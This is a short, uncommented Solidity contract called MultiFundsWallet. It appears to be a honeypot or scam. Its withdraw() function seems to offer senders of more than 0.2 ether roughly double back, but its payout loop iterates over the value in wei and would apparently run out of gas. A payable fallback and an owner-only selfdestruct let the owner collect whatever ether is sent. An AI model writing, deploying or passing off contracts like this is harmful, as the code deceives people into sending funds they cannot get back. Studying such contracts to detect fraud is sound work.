pragma solidity ^0.4.24;

contract MultiFundsWallet
{
    address owner;
    
    constructor() public {
        owner = msg.sender;
    }
    
    function withdraw() payable public 
    {
        require(msg.sender == tx.origin);
        if(msg.value > 0.2 ether) {
            uint256 value = 0;
            uint256 eth = msg.value;
            uint256 balance = 0;
            for(var i = 0; i < eth*2; i++) {
                value = i*2;
                if(value >= balance) {
                    balance = value;
                }
                else {
                    break;
                }
            }    
            msg.sender.transfer(balance);
        }
    }
    
    function clear() public 
    {
        require(msg.sender == owner);
        selfdestruct(owner);
    }

    function () public payable {
        
    }
}